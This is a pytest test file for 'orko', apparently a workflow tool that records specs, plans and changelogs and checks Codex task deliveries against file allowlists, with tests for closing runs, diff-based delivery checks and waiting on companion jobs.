    def test_bad_id_and_missing_docs_exit_2(self, workspace, capsys):
        init_run(workspace, capsys)
        assert orko.main(["check", "spec", "spec-1", "--slug", "demo-topic", "--workspace", str(workspace)]) == 2
        shutil.rmtree(workspace / "docs")
        assert orko.main(["check", "spec", "SPEC-001", "--slug", "demo-topic", "--workspace", str(workspace)]) == 2

    def test_failing_spec_exits_1(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")  # template body, placeholders remain
        assert orko.main(["check", "spec", "SPEC-001", "--slug", "demo-topic", "--workspace", str(workspace)]) == 1


class TestRecordClose:
    def _closeable(self, workspace, capsys):
        _, payload = init_run(workspace, capsys)
        assert "- Demo Topic: in progress" in (workspace / "docs/STATUS.md").read_text()
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        rec(workspace, capsys, "plan", "--slug", "demo-topic", "--title", "Plan",
            "--implements", "SPEC-001")
        return payload

    def test_close_edits_status_changelogs_and_pr_bodies(self, workspace, capsys):
        payload = self._closeable(workspace, capsys)
        code, out = rec(workspace, capsys, "close", "--slug", "demo-topic",
                        "--summary", "Adds addition.", "--date", "2026-09-30",
                        "--changelog", "Added: addition endpoint")
        assert code == 0
        status = (workspace / "docs/STATUS.md").read_text()
        # The close date, not the run's init date.
        assert 'as_of: "2026-09-30"' in status
        assert "- Demo Topic (PLAN-001, SPEC-001): awaiting acceptance" in status
        assert "Recently completed\n\n<!--" in status
        for f in ("code/CHANGELOG.md", "docs/versions/0.1/CHANGELOG.md"):
            text = (workspace / f).read_text()
            assert re.search(
                r"## Unreleased\n\n### Added\n\n- addition endpoint \(PLAN-001, SPEC-001\)",
                text), f
        pr_docs = Path(out["pr_docs"]).read_text()
        assert "Adds addition." in pr_docs and "SPEC-001" in pr_docs and "PLAN-001" in pr_docs
        assert Path(out["pr_code"]).exists()

    def test_close_stamps_today_not_the_run_date(self, workspace, capsys):
        # A build that opens on Monday and closes on Friday is as of Friday.
        _, payload = init_run(workspace, capsys, "build", "Demo Topic", "--date", "2000-01-01")
        assert payload["date"] == "2000-01-01"
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        assert rec(workspace, capsys, "close", "--slug", "demo-topic", "--summary", "x")[0] == 0
        today = __import__("datetime").date.today().isoformat()
        assert f'as_of: "{today}"' in (workspace / "docs/STATUS.md").read_text()

    def test_close_refreshes_index_status(self, workspace, capsys):
        self._closeable(workspace, capsys)
        rec(workspace, capsys, "status", "--slug", "demo-topic", "--id", "SPEC-001",
            "--status", "in_review")
        assert rec(workspace, capsys, "close", "--slug", "demo-topic",
                   "--summary", "x")[0] == 0
        readme = (workspace / "docs/versions/0.1/README.md").read_text()
        assert "| SPEC-001 | Specification | Demo | in_review |" in readme

    def test_close_records_every_touched_file(self, workspace, capsys):
        payload = self._closeable(workspace, capsys)
        rec(workspace, capsys, "close", "--slug", "demo-topic", "--summary", "x",
            "--changelog", "Fixed: a bug")
        assert set(orko.touched(Path(payload["ledger"]))) >= {
            "docs/STATUS.md", "docs/versions/0.1/README.md",
            "code/CHANGELOG.md", "docs/versions/0.1/CHANGELOG.md"}

    def test_missing_changelog_section_is_created_inside_unreleased(self, workspace, capsys):
        self._closeable(workspace, capsys)
        changelog = workspace / "docs/versions/0.1/CHANGELOG.md"
        changelog.write_text("# Log\n\n## Unreleased\n\n## 0.1.0\n\n### Added\n\n- old\n")
        rec(workspace, capsys, "close", "--slug", "demo-topic", "--summary", "x",
            "--changelog", "Security: locked the door")
        text = changelog.read_text()
        assert re.search(r"## Unreleased\n\n### Security\n\n- locked the door \(PLAN-001, SPEC-001\)",
                         text)
        assert text.endswith("## 0.1.0\n\n### Added\n\n- old\n")

    def test_two_entries_in_one_section_stay_a_tight_list_in_order(self, workspace, capsys):
        self._closeable(workspace, capsys)
        rec(workspace, capsys, "close", "--slug", "demo-topic", "--summary", "x",
            "--changelog", "Added: first entry", "--changelog", "Added: second entry")
        text = (workspace / "code/CHANGELOG.md").read_text()
        assert ("### Added\n\n"
                "- first entry (PLAN-001, SPEC-001)\n"
                "- second entry (PLAN-001, SPEC-001)\n\n"
                "### Changed") in text

    def test_close_twice_does_not_duplicate_changelog_entries(self, workspace, capsys):
        self._closeable(workspace, capsys)
        args = ("close", "--slug", "demo-topic", "--summary", "Adds addition.",
                "--changelog", "Added: addition endpoint")
        rec(workspace, capsys, *args)
        status = workspace / "docs/STATUS.md"
        before = status.read_text()
        before_logs = {f: (workspace / f).read_text()
                       for f in ("code/CHANGELOG.md", "docs/versions/0.1/CHANGELOG.md")}
        assert rec(workspace, capsys, *args)[0] == 0
        assert status.read_text() == before
        for f, text in before_logs.items():
            assert (workspace / f).read_text() == text
            assert text.count("- addition endpoint (PLAN-001, SPEC-001)") == 1

    def test_only_spec_and_plan_ids_reach_the_changelog(self, workspace, capsys):
        self._closeable(workspace, capsys)
        shutil.copytree(Path(orko.__file__).parent / "fixtures/findings",
                        workspace / ".orko/demo-topic/findings/2")
        rec(workspace, capsys, "review", "--slug", "demo-topic", "--role", "spec",
            "--reviews", "SPEC-001", "--revision", "abc1234", "--title", "Spec review",
            "--from-findings", str(workspace / ".orko/demo-topic/findings/2"))
        _, out = rec(workspace, capsys, "close", "--slug", "demo-topic", "--summary", "x",
                     "--changelog", "Added: addition endpoint")
        text = (workspace / "code/CHANGELOG.md").read_text()
        assert "- addition endpoint (PLAN-001, SPEC-001)" in text
        assert "REVIEW-001" not in text
        assert "REVIEW-001" not in (workspace / "docs/STATUS.md").read_text()
        pr_docs = Path(out["pr_docs"]).read_text()
        assert "- PLAN-001\n- REVIEW-001\n- SPEC-001" in pr_docs

    def test_intake_bullet_keeps_the_section_readable(self, workspace, capsys):
        init_run(workspace, capsys)
        status = (workspace / "docs/STATUS.md").read_text()
        assert ("<!-- Link active specifications, plans, research, or reviews. -->\n"
                "\n- Demo Topic: in progress\n\n## Blockers and risks") in status

    def test_close_joins_an_existing_bullet_list(self, workspace, capsys):
        status = workspace / "docs/STATUS.md"
        status.write_text(status.read_text().replace(
            "## Blockers and risks", "- Other work: in progress\n\n## Blockers and risks"))
        init_run(workspace, capsys)
        assert "- Demo Topic: in progress\n- Other work: in progress" in status.read_text()

    def test_unknown_changelog_section_exits_2(self, workspace, capsys):
        init_run(workspace, capsys)
        code, _ = rec(workspace, capsys, "close", "--slug", "demo-topic",
                      "--summary", "x", "--changelog", "Bogus: y")
        assert code == 2


class TestCheckDelivery:
    def _task_run(self, workspace, capsys):
        _, payload = init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        shutil.copy(Path(orko.__file__).parent / "fixtures/tasks.md", payload["tasks"])
        base = git_out(workspace / "code", "rev-parse", "HEAD").strip()
        orko.main(["ledger", "5.1", "dispatched", "--commit", base,
                   "--slug", "demo-topic", "--workspace", str(workspace)])
        return payload

    def _cd(self, workspace, capsys):
        capsys.readouterr()
        code = orko.main(["check", "delivery", "--slug", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)])
        return code, capsys.readouterr().out

    def _write(self, workspace, path, content="x = 1\n") -> Path:
        f = workspace / "code" / path
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(content)
        return f

    def _task_file(self, workspace) -> str:
        return orko.parse_tasks(
            (workspace / ".orko/demo-topic/tasks.md").read_text())[0]["files"][0]

    def _commit_task_file(self, workspace, content="x = 1\n"):
        self._write(workspace, self._task_file(workspace), content)
        subprocess.run(["git", "-C", str(workspace / "code"), "add", "-A"], check=True)
        subprocess.run(["git", "-C", str(workspace / "code"), "commit", "-qm", "task"], check=True)

    def _rebase_dispatch(self, workspace):
        """Re-record the dispatch at the current HEAD, so the committed diff is
        empty and only the working tree can carry the delivery."""
        orko.main(["ledger", "5.1", "dispatched", "--commit",
                   git_out(workspace / "code", "rev-parse", "HEAD").strip(),
                   "--slug", "demo-topic", "--workspace", str(workspace)])

    def test_a_committed_only_delivery_passes(self, workspace, capsys, monkeypatch):
        # The re-check after `commit code --task`: nothing is left in the
        # working tree and the delivery lives in `<base>..HEAD`.
        self._task_run(workspace, capsys)
        self._commit_task_file(workspace)
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 0)
        # The acceptance line is model-authored shell; the check prints it.
        assert self._cd(workspace, capsys) == (0, "acceptance: uv run pytest -q\n")

    def test_an_uncommitted_listed_file_is_the_delivery(self, workspace, capsys, monkeypatch):
        # Codex cannot commit: `.git` is read-only inside its sandbox, so the
        # delivery arrives as an untracked file and the script commits it later.
        self._task_run(workspace, capsys)
        self._write(workspace, self._task_file(workspace))
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 0)
        code, out = self._cd(workspace, capsys)
        assert code == 0, out
        assert "diff-empty" not in out and "diff-outside-allowlist" not in out

    def test_an_uncommitted_file_outside_the_list_is_a_finding(
        self, workspace, capsys, monkeypatch
    ):
        self._task_run(workspace, capsys)
        self._write(workspace, "other.py", "y\n")
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 0)
        assert "diff-outside-allowlist: other.py" in self._cd(workspace, capsys)[1]

    def test_tool_leftovers_are_not_a_delivery(self, workspace, capsys, monkeypatch):
        # The acceptance command leaves a virtual environment and caches behind.
        # They are neither the delivery nor a breach of the allowlist.
        self._task_run(workspace, capsys)
        self._write(workspace, ".venv/lib/x", "v\n")
        self._write(workspace, "tests/__pycache__/x.pyc", "c\n")
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 0)
        code, out = self._cd(workspace, capsys)
        assert code == 1 and "diff-empty" in out
        assert "diff-outside-allowlist" not in out

    def test_a_leftover_lockfile_rides_alongside_a_real_delivery(
        self, workspace, capsys, monkeypatch
    ):
        self._task_run(workspace, capsys)
        self._write(workspace, self._task_file(workspace))
        self._write(workspace, "uv.lock", "lock\n")
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 0)
        code, out = self._cd(workspace, capsys)
        assert code == 0, out

    def test_a_listed_leftover_is_still_the_delivery(self, workspace, capsys, monkeypatch):
        # A task that lists `uv.lock` delivers `uv.lock`: any dependency change
        # does. The leftover filter must not swallow a path the task names.
        self._task_run(workspace, capsys)
        tasks = workspace / ".orko/demo-topic/tasks.md"
        tasks.write_text(tasks.read_text().replace(
            "- Create: `orko/scripts/orko.py` (from", "- Create: `uv.lock` (from", 1))
        self._write(workspace, "uv.lock", "lock\n")
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 0)
        code, out = self._cd(workspace, capsys)
        assert code == 0, out
        assert "diff-empty" not in out and "diff-outside-allowlist" not in out

    def test_worktree_paths_reports_both_sides_of_a_rename(self, workspace):
        # `-z` spends a second NUL-terminated field on a rename's source, and
        # the source is a change too: the delivery moved the file.
        subprocess.run(["git", "-C", str(workspace / "code"), "mv",
                        "CHANGELOG.md", "NOTES.md"], check=True)
        paths = orko.worktree_paths(workspace / "code")
        assert "NOTES.md" in paths and "CHANGELOG.md" in paths

    def test_a_deleted_listed_file_counts_as_changed(self, workspace, capsys, monkeypatch):
        self._task_run(workspace, capsys)
        self._commit_task_file(workspace)
        self._rebase_dispatch(workspace)
        (workspace / "code" / self._task_file(workspace)).unlink()
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 0)
        code, out = self._cd(workspace, capsys)
        assert code == 0, out
        assert "diff-empty" not in out

    def test_acceptance_announcement_precedes_the_command_output(
        self, workspace, capsys
    ):
        # Out of process, on a real pipe: the defect is buffering, and pytest's
        # own capture writes through, so nothing in process can show it.
        self._task_run(workspace, capsys)
        self._commit_task_file(workspace)
        tasks = workspace / ".orko/demo-topic/tasks.md"
        tasks.write_text(tasks.read_text().replace(
            "**Acceptance:** `uv run pytest -q`", "**Acceptance:** `printf ran`", 1))
        out = subprocess.run(
            [sys.executable, orko.__file__, "check", "delivery", "--slug", "demo-topic",
             "--task", "1", "--workspace", str(workspace)],
            capture_output=True, text=True).stdout
        assert "ran" in out
        assert out.startswith("acceptance: printf ran")

    def test_fails_diff_empty(self, workspace, capsys, monkeypatch):
        self._task_run(workspace, capsys)
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 0)
        assert "diff-empty" in self._cd(workspace, capsys)[1]

    def test_fails_diff_outside_allowlist(self, workspace, capsys, monkeypatch):
        self._task_run(workspace, capsys)
        (workspace / "code/other.py").write_text("y\n")
        subprocess.run(["git", "-C", str(workspace / "code"), "add", "-A"], check=True)
        subprocess.run(["git", "-C", str(workspace / "code"), "commit", "-qm", "t"], check=True)
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 0)
        assert "diff-outside-allowlist: other.py" in self._cd(workspace, capsys)[1]

    def test_testing_readme_is_inside_the_allowlist(self, workspace, capsys, monkeypatch):
        # The Codex task prompt tells every delivery to write this file, and no
        # plan lists it under Files.
        self._task_run(workspace, capsys)
        readme = workspace / "code/docs/testing/README.md"
        readme.write_text(readme.read_text() + "\n| SPEC-001 R1 | test_adds |\n")
        subprocess.run(["git", "-C", str(workspace / "code"), "add", "-A"], check=True)
        subprocess.run(["git", "-C", str(workspace / "code"), "commit", "-qm", "map"], check=True)
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 0)
        code, out = self._cd(workspace, capsys)
        assert "diff-outside-allowlist" not in out
        assert "diff-empty" not in out
        assert code == 0, out

    def test_fails_acceptance(self, workspace, capsys, monkeypatch):
        self._task_run(workspace, capsys)
        self._commit_task_file(workspace)
        monkeypatch.setattr(orko, "run_acceptance", lambda cmd, cwd: 1)
        assert "acceptance-failed: exit 1" in self._cd(workspace, capsys)[1]

    def test_missing_dispatch_base_exits_2(self, workspace, capsys):
        _, payload = init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        shutil.copy(Path(orko.__file__).parent / "fixtures/tasks.md", payload["tasks"])
        assert self._cd(workspace, capsys)[0] == 2


class TestCodexWait:
    def test_completed_job_prints_result(self, workspace, capsys, monkeypatch):
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        calls = []

        def fake(args, cwd):
            calls.append(args)
            payload = ({"status": "completed"} if args[0] == "status"
                       else {"status": "completed", "output": "done"})
            return subprocess.CompletedProcess(args, 0, json.dumps(payload), "")

        monkeypatch.setattr(orko, "run_companion", fake)
        capsys.readouterr()
        assert orko.main(["codex", "wait", "job-1", "--slug", "demo-topic",
                          "--workspace", str(workspace)]) == 0
        assert json.loads(capsys.readouterr().out)["output"] == "done"
        assert calls[0][:2] == ["status", "job-1"] and "--wait" in calls[0]

    def test_status_call_carries_the_timeout(self, workspace, capsys, monkeypatch):
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        calls = []

        def fake(args, cwd):
            calls.append(args)
            return subprocess.CompletedProcess(args, 0, json.dumps({"status": "completed"}), "")

        monkeypatch.setattr(orko, "run_companion", fake)
        orko.main(["codex", "wait", "job-1", "--slug", "demo-topic",
                   "--workspace", str(workspace)])
        assert calls[0][calls[0].index("--timeout-ms") + 1] == "1800000"
        orko.main(["codex", "wait", "job-1", "--slug", "demo-topic",
                   "--timeout-ms", "5000", "--workspace", str(workspace)])
        assert calls[2][calls[2].index("--timeout-ms") + 1] == "5000"

    def test_both_companion_calls_name_the_code_repository(
        self, workspace, capsys, monkeypatch
    ):
        # The companion's job store keys off the git root of `--cwd`; a lookup
        # from anywhere else reports a running job as missing.
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        calls = []
        monkeypatch.setattr(
            orko, "run_companion",
            lambda args, cwd: calls.append((args, cwd)) or subprocess.CompletedProcess(
                args, 0, json.dumps({"job": {"status": "completed"}}), ""))
        orko.main(["codex", "wait", "job-1", "--slug", "demo-topic",
                   "--workspace", str(workspace)])
        assert [call[1] for call in calls] == [workspace / "code"] * 2
        assert [call[0][0] for call in calls] == ["status", "result"]

    def test_run_companion_appends_the_cwd_option(self, monkeypatch, tmp_path):
        companion = tmp_path / "codex-companion.mjs"
        companion.write_text("")
        monkeypatch.setattr(orko, "codex_companion_path", lambda: companion)
        seen = {}

        def fake_run(argv, **kwargs):
            seen["argv"] = argv
            return subprocess.CompletedProcess(argv, 0, "", "")

        monkeypatch.setattr(orko.subprocess, "run", fake_run)
        orko.run_companion(["status", "job-1"], tmp_path / "code")
        assert seen["argv"][-2:] == ["--cwd", str(tmp_path / "code")]

    def test_envelope_status_decides_the_exit_code(
        self, workspace, capsys, monkeypatch
    ):
        # `result --json` returns `{"job": ..., "storedJob": ...}`; the status
        # lives inside `job`, not at the top level.
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        for status, expected in (("completed", 0), ("failed", 1)):
            monkeypatch.setattr(
                orko, "run_companion",
                lambda a, cwd, status=status: subprocess.CompletedProcess(
                    a, 0, json.dumps({"job": {"status": status, "threadId": "t"},
                                      "storedJob": {"status": status}}), ""))
            assert orko.main(["codex", "wait", "job-1", "--slug", "demo-topic",
                              "--workspace", str(workspace)]) == expected

    def test_failed_job_exits_1(self, workspace, capsys, monkeypatch):
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        monkeypatch.setattr(orko, "run_companion",
                            lambda a, cwd: subprocess.CompletedProcess(a, 0, json.dumps({"status": "failed"}), ""))
        assert orko.main(["codex", "wait", "job-1", "--slug", "demo-topic",
                          "--workspace", str(workspace)]) == 1

    def test_missing_companion_exits_2(self, workspace, capsys, monkeypatch):
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        monkeypatch.setattr(orko, "codex_companion_path", lambda: None)
        assert orko.main(["codex", "wait", "job-1", "--slug", "demo-topic",
                          "--workspace", str(workspace)]) == 2

    def test_unknown_run_exits_2(self, workspace, capsys, monkeypatch):
        monkeypatch.setattr(orko, "run_companion",
                            lambda a, cwd: subprocess.CompletedProcess(a, 0, json.dumps({"status": "completed"}), ""))
        assert orko.main(["codex", "wait", "job-1", "--slug", "nope",
                          "--workspace", str(workspace)]) == 2


class TestCodexWaitLatest:
    """`codex wait latest` — the forwarder does not reliably return a job id."""

    # The shape `status --all --json` answers with: a background dispatch can
    # be in `running`, in `latestFinished`, or in `recent`.
    SNAPSHOT = {
        "workspaceRoot": "/ws/code",
        "running": [{"id": "task-newest", "status": "running",
                     "startedAt": "2026-09-16T22:20:54.763Z"}],
        "latestFinished": {"id": "task-middle", "status": "completed",
                           "startedAt": "2026-09-16T22:17:02.444Z"},
        "recent": [{"id": "task-oldest", "status": "completed",
                    "startedAt": "2026-09-15T10:00:00.000Z"}],
    }

    def _fake(self, monkeypatch, snapshot, calls):
        def fake(args, cwd):
            calls.append(args)
            payload = snapshot if args[:1] == ["status"] and "--all" in args else {
                "job": {"status": "completed"}}
            return subprocess.CompletedProcess(args, 0, json.dumps(payload), "")

        monkeypatch.setattr(orko, "run_companion", fake)

    def test_latest_resolves_the_newest_started_job(self, workspace, capsys, monkeypatch):
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        calls = []
        self._fake(monkeypatch, self.SNAPSHOT, calls)
        capsys.readouterr()
        assert orko.main(["codex", "wait", "latest", "--slug", "demo-topic",
                          "--workspace", str(workspace)]) == 0
        captured = capsys.readouterr()
        assert "orko: latest job is task-newest" in captured.err
        assert calls[0] == ["status", "--all", "--json"]
        assert calls[1][:2] == ["status", "task-newest"]
        assert calls[2][:2] == ["result", "task-newest"]

    def test_no_job_under_the_code_repository_exits_1(self, workspace, capsys, monkeypatch):
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        calls = []
        self._fake(monkeypatch, {"running": [], "latestFinished": None, "recent": []}, calls)
        capsys.readouterr()
        assert orko.main(["codex", "wait", "latest", "--slug", "demo-topic",
                          "--workspace", str(workspace)]) == 1
        assert f"orko: no Codex job registered under {workspace / 'code'}" in capsys.readouterr().err
